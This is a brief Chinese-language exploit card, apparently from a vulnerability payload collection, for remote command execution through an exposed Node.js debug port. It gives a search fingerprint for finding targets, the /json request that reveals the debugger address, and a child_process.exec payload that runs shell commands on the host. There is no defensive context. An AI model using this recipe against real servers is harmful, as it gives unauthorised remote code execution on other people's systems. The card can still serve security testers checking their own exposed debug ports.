# Node.js调试模式任意命令执行漏洞

Node ｜ 命令执行 ｜ —
- **指纹**：`body="WebSockets request was expected"`
- **请求**：`http://IP/json`

**Payload**
```
获取快捷调试地址
访问并执行命令
require("child_process").exec("ls /", (err,std) => console.log(std))
:---
```
- **响应特征**：200